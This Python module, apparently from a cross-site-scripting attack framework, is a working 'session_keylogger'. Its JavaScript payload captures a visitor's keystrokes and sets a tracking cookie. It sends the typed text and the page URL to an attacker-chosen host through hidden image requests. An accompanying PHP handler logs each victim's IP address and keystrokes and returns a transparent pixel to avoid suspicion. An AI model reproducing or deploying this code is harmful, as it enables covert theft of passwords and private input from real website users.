#!/usr/bin/python3.7
import socket
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="session_keylogger"
description="A keylogger which follows user sessions thanks to an ID set into a cookie"
options = [["LHOST", "Host to send captured strokes to", local_ip()], 
           ["INTERVAL", "Number of seconds after which captured keystrokes are sent", "10"],
           ["TRACK_KEYS", "Track keystrokes", "true"],
           ["TRACK_MOUSE", "Track mouse movement", "false"],
           ["TRACK_CLICKS", "Track mouse clicks", "false"],
           ["COOKIE_NAME", "Name of the cookie shown in the browser", "cook"],
           ["COOKIE_LIFETIME", "Lifetime of cookie in days", "1"]]
handler_options = [["LOGFILE", "File to store logged data", "session_klog.txt"]]

payload = """

function Keylogger(){
 //Bufers


 /*
  * Configuration of the keylogger
  ******
  * track_keys : True if one wants to track the key pressed
  * track_mouse : True if one wants to track the movements of mouse
  * track_clicks : true if one wants to track the click
  * send_interval_s : interval to send the request to the server (in second)
  * distant_server : address of the server
  * cookie_name : Name of the cookie in the browser
  * cookie_lifetime : Lifetime of the cookie in days
  */
 this.keylog_configuration={
   track_keys: TRACK_KEYS,
   track_mouse: TRACK_MOUSE,
   track_clicks: TRACK_CLICKS,
   send_interval_s: INTERVAL,
   distant_server:'http://LHOST:8000/handler.php',
   cookie_name:'COOKIE_NAME',
   cookie_lifetime: COOKIE_LIFETIME
 };
 /*
  * Function that generates a GUID (but not a strong one)
  */
 this.S4=function() {
   return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
 };

 /*
  * Constructor-like function
  * Initialize elements to the right values
  */
 this.begin=function(){

  var guid_in_cookies;
  var i,x,y,ARRcookies=document.cookie.split(";");
  for (i=0;i<ARRcookies.length;i++)
    {
    x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
    y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
    x=x.replace(/^\s+|\s+$/g,"");
    if (x==this.keylog_configuration.cookie_name)
      {
     guid_in_cookies= unescape(y);
      }
    }

  if(guid_in_cookies!=null && guid_in_cookies.length >0){
   this.guid=guid_in_cookies;
  }
  else{
   /* Create the GUID */
   this.guid= (this.S4()+this.S4()+"-"+this.S4()+"-"+
     this.S4()+"-"+this.S4()+"-"+this.S4()+
     this.S4()+this.S4());

   /* Cookie setup*/
   var exdate = new Date();
   var exdays = this.keylog_configuration.cookie_lifetime;
   exdate.setDate(exdate.getDate() +exdays );

   var c_value=escape(this.guid) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
   document.cookie=this.keylog_configuration.cookie_name + "=" + c_value;
  }
  this.from_page=encodeURIComponent(window.location.href);
  this.transfer_buffer();
  //alert("Method had been called" + this.property1);
 };
 /*
  * Insert a key
  */
 this.insert_key=function(event){
  var new_char='';
  if(event.altKey){
   new_char = '{{Alt}}';
  }else if(event.ctrlKey){
   new_char = '{{Ctrl}}';
  }else if(event.shiftKey){
   new_char = '{{Shift}}';
  }
  if(event.keyCode!=null){
   if(event.keyCode){
    new_char=new_char+this.decodeChar(event.keyCode);
   }else{
    new_char=new_char+this.decodeChar(event.charCode);
   }
  }

  this.buffer_text_current=this.buffer_text_current+new_char;
 };

 /*
  * Decode special characters.
  */
 this.decodeChar=function(code){
  var charac;
  switch(code){
  case 8:
   charac='{{Backspace}}';
   break;
  case 9:
   charac='{{Tab}}';
   break;
  case 13:
   charac='{{Enter}}';
   break;
  case 33:
   break;
  case 37:
   charac='{{<-}}';
   break;
  case 38:
   charac='{{up}}';
   break;
  case 39:
   charac='{{->}}';
   break;
  case 40:
   charac='{{down}}';
   break;
  case 46:
   charac='{{delete}}';
   break;
  case 91:
   charac='{{leftWindow}}';
   break;
  case 92:
   charac='{{rightWindow}}';
   break;
  case 154:
   charac='{{PrtScreen}}';
   break;
  default:
   charac=String.fromCharCode(code);
   break;
  }
  return charac;
 };
 /*
  *
  */
 this.insert_click=function(event){
  // Nothing at the moment
 };
 /*
  *
  */
 this.send_infos=function(){
  var parameters='?frompage='+this.from_page;
  parameters =parameters + '&guid='+this.guid;
  parameters = parameters + '&text='+encodeURIComponent(this.buffer_text_to_send);
  var address_to_call=this.keylog_configuration.distant_server+parameters;
  //We just preload the image without actually inserting it
  image01= new Image();
  image01.src=address_to_call;
 };
 /*
  * Swap values
  */
 this.transfer_buffer=function(){
  this.buffer_text_to_send=this.buffer_text_current;
  this.buffer_text_current='';
  this.send_infos();

  var t = setTimeout('logger.transfer_buffer()',this.keylog_configuration.send_interval_s*1000);
 };


 this.buffer_text_current='[Begin session]',
 this.buffer_text_to_send='',
 //Important information
 this.guid='UNDEFINED',
 this.from_page='UNDEFINED';


}
var logger = new Keylogger();
/*
 * Launch the logger
 */
function launch(){
 logger.begin();
 //binding for key pressed
 if(logger.keylog_configuration.track_keys){
    if (navigator.appName == 'Microsoft Internet Explorer')
    {
     document.body.attachEvent('onkeypress',process_key);
    }else{
     //Binding for everything but ie
    document.addEventListener('keypress',process_key,false);

     //document.body.setAttribute('onKeyPress','Keylogger.insert_key(event)');
    }
 }
 //Binding for click
 if(logger.keylog_configuration.track_clicks){
  //Binding for everything but ie
  //document.body.setAttribute('onclick','Keylogger.insert_click(event)');
 }
}

function process_key(event){
 logger.insert_key(event);
}"""

handler = """

<?php

/*
 * Create a 1 by 1 image with transparent background( if the browser is suspicious of call to non image)
 */
function create_fake_image(){
  header('content-type:image/png');
  // One by one pixel
  $im = imagecreatetruecolor(1, 1);
  $background_black = imagecolorallocate($im, 0, 0, 0);
  imagecolortransparent($im,$background_black);
  imagePNG($im);
}

?>

<?php 

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $text=$_GET['text'];
    $guid=$_GET['guid'];
    $source_page=$_GET['frompage'];
    $log_string = "\n[*]Source ip: %s (GUID: %s)\n[*]Source page: %s\n[*] Captured data: %s\n\n"
    $f=fopen("LOGFILE","a+");
    fwrite($f, sprintf($log_string, $ip, $guid, $source_page, $text));
    fclose($f);

create_fake_image();

?>"""
